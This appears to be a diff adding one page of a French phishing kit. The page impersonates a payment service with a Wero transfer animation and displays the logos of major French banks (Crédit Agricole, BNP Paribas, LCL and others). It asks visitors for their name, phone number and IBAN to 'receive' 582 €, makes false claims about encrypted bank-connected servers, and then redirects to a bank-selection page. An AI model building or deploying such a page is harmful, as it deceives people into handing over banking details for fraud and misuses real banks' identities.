@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Informations de compte</title>
+    
+    <style>
+        :root { --jaune-fond: #ffe680; --jaune-accent: #fff4c2; }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:var(--jaune-fond); min-height:100vh; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; color:#1a1a1a; display:flex; justify-content:center; align-items:center; padding:20px; }
+        .card { background:white; border-radius:16px; box-shadow:0 10px 40px rgba(0,0,0,0.12); max-width:500px; width:100%; overflow:hidden; text-align:center; padding:30px 24px; }
+        .header { background:var(--jaune-accent); padding:20px; border-radius:16px 16px 0 0; display:flex; align-items:center; justify-content:flex-start; }
+        .logo-img { width:60px; height:60px; margin-left:20px; object-fit:contain; }
+        h1 { font-size:1.9rem; margin:30px 0 10px; color:#111; }
+        .subtitle { font-size:1.1rem; color:#444; margin-bottom:20px; }
+        .info-text { font-size:0.95rem; color:#555; margin:20px 0 30px; line-height:1.6; text-align:left; }
+        .form-group { margin:25px 0; text-align:left; }
+        .form-group label { display:block; margin-bottom:8px; font-weight:bold; color:#333; font-size:1rem; }
+        .form-group input { width:100%; padding:14px; border:1px solid #ccc; border-radius:8px; font-size:1rem; }
+        .form-group small { color:#666; font-size:0.85rem; display:block; margin-top:6px; }
+        .btn { background:var(--jaune-accent); color:#000; font-size:1.2rem; font-weight:bold; padding:16px 50px; border:none; border-radius:50px; cursor:pointer; margin:30px 0 20px; transition:all 0.2s; box-shadow:0 6px 15px rgba(255,244,194,0.5); width:100%; max-width:300px; }
+        .btn:hover { transform:translateY(-2px); box-shadow:0 10px 25px rgba(255,244,194,0.7); }
+        .partners-title { font-size:0.95rem; color:#666; margin:30px 0 15px; }
+        .partners-logos { display:grid; grid-template-columns:repeat(auto-fit,minmax(80px,1fr)); gap:15px; max-width:420px; margin:0 auto; }
+        .logo-item { width:80px; height:50px; margin:0 auto; display:flex; align-items:center; justify-content:center; background:white; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.08); padding:8px; }
+        .logo-item img { max-width:100%; max-height:100%; object-fit:contain; }
+        .footer { font-size:0.85rem; color:#777; margin-top:40px; line-height:1.6; }
+        .footer a { color:#0066cc; margin:0 8px; text-decoration:none; }
+        .footer a:hover { text-decoration:underline; }
+        #loader { position:fixed; top:0; left:0; width:100%; height:100%; background:#ffffff; display:none; flex-direction:column; justify-content:center; align-items:center; z-index:9999; }
+        .loader-container { text-align:center; width:90%; max-width:600px; }
+        .flex-row { display:flex; align-items:center; justify-content:center; gap:30px; margin-bottom:50px; flex-wrap:nowrap; }
+        .image-box { max-width:140px; max-height:140px; border-radius:16px; overflow:hidden; box-shadow:0 6px 20px rgba(0,0,0,0.12); flex-shrink:0; }
+        .image-box img { width:100%; height:100%; object-fit:contain; }
+        .arrow { font-size:4rem; color:#000; font-weight:bold; min-width:60px; }
+        .loading-text { font-size:1.8rem; font-weight:bold; color:#000; letter-spacing:1px; position:relative; }
+        .loading-text::after { content:"."; animation:dots 1.5s steps(4,end) infinite; }
+        @keyframes dots { 0%{content:".";} 33%{content:"..";} 66%{content:"...";} 100%{content:".";} }
+        @media (max-width:500px) { .flex-row {gap:20px;} .image-box {max-width:110px;max-height:110px;} .arrow {font-size:3rem;} .loading-text {font-size:1.6rem;} }
+        @media (max-width:480px) { .card {padding:20px 16px;} .logo-img {width:50px;height:50px;margin-left:15px;} .partners-logos {grid-template-columns:repeat(auto-fit,minmax(70px,1fr));gap:10px;} .logo-item {width:70px;height:45px;padding:6px;} }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="header">
+            <img src="https://i.postimg.cc/3rvSQHBz/IMG-7193.jpg" alt="Logo" class="logo-img">
+        </div>
+        
+        <h1>Informations de compte.</h1>
+        
+        <p class="subtitle">Pour renforcer la sécurité, nous réalisons parfois des vérifications rapides de vos informations.</p>
+        
+        <p class="info-text">
+            <strong>Important :</strong> toutes vos données sont cryptées et stockées sur des serveurs ultra-sécurisés, connectés directement à votre banque et totalement protégés de tout accès non autorisé.
+        </p>
+        
+        <form id="info-form">
+            <div class="form-group">
+                <label>Nom et prénom(s)</label>
+                <input type="text" placeholder="Nom prénom(s)" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Numéro de téléphone</label>
+                <input type="tel" placeholder="+33 6 12 34 56 78" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Montant à recevoir</label>
+                <input type="text" id="montant-display" value="582 €" readonly>
+            </div>
+            
+            <div class="form-group">
+                <label>IBAN</label>
+                <input type="text" placeholder="FR76 1234 5678 9012 3456 7890 12" required>
+                <small>Veuillez entrer votre IBAN au format FR76 ***.</small>
+            </div>
+            
+            <button type="submit" class="btn">VÉRIFIER MON IBAN</button>
+        </form>
+        
+        <div class="partners">
+            <div class="partners-title">Ce service vous est proposé par :</div>
+            <div class="partners-logos">
+                <div class="logo-item"><img src="https://i.postimg.cc/sgmvS1XN/agricole.png" alt="Crédit Agricole"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/dQhHxycG/bnp.png" alt="BNP Paribas"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/28vHzN66/caisse.png" alt="Caisse d'Épargne"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/2SD0y9bx/cic.png" alt="CIC"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/859HSZgM/hello.png" alt="Arkéa"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/y63jPC0P/lcl.png" alt="LCL"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/Gh0QggQ1/arkea.png" alt="Arkéa"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/YCMxM4Zn/mutuel.png" alt="Crédit Mutuel"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/nh2GzFtH/postal.png" alt="La Banque Postale"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/zffSHsJT/societe.png" alt="Société Générale"></div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#">Mentions légales</a> | 
+            <a href="#">FAQ</a> | 
+            <a href="#">CGU</a> | 
+            <a href="#">Cookies et données</a> | 
+            <a href="#">Se désinscrire</a>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        let montant = urlParams.get('montant') || '582';
+        document.getElementById('montant-display').value = montant + ' €';
+
+        document.getElementById('info-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            document.body.innerHTML = '';
+            document.body.style.background = '#ffffff';
+            document.body.innerHTML = `
+                <div class="loader-container">
+                    <div class="flex-row">
+                        <div class="image-box">
+                            <img src="https://i.postimg.cc/jSTLYbWt/téléchargement.png" alt="Wero" style="width:100%;height:100%;object-fit:contain;border-radius:16px;box-shadow:0 6px 20px rgba(0,0,0,0.12);">
+                        </div>
+                        <div class="arrow">→</div>
+                        <div class="image-box">
+                            <img src="https://i.postimg.cc/hvN9wFcd/virement_banacaire.png" alt="Banque" style="width:100%;height:100%;object-fit:contain;border-radius:16px;box-shadow:0 6px 20px rgba(0,0,0,0.12);">
+                        </div>
+                    </div>
+                    <div class="loading-text">Chargement</div>
+                </div>
+            `;
+            setTimeout(function() {
+                window.location.href = 'selection-banque.html?montant=' + montant;
+            }, 3500);
+        });
+    </script>
+
+</body>
+</html>
